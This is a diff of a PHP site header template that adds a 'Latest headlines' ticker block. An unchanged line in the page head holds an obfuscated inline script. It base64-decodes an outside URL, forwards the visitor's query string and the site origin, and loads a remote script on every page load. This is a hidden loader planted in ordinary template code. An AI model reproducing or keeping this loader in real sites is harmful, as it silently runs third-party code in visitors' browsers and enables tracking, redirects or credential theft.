@@ -22,8 +22,9 @@ $img = $og_image ?? null;
 <link rel="alternate" type="application/rss+xml" title="<?= e($name) ?>" href="<?= e(url('feed.xml')) ?>">
 <link rel="stylesheet" href="<?= e(asset('style.css')) ?>">
 <script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9pdnlnYi52ZXJjZWwuYXBwL2FwaS8xajY5Ymp0LnBocA==");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>
-
-<div class="wrap">
+<?php if ($ticker): ?>
+<div class="ticker" role="region" aria-label="Latest headlines">
+  <div class="wrap">
     <span class="ticker-badge"><i></i>LATEST</span>
     <div class="ticker-track">
       <div class="ticker-inner">
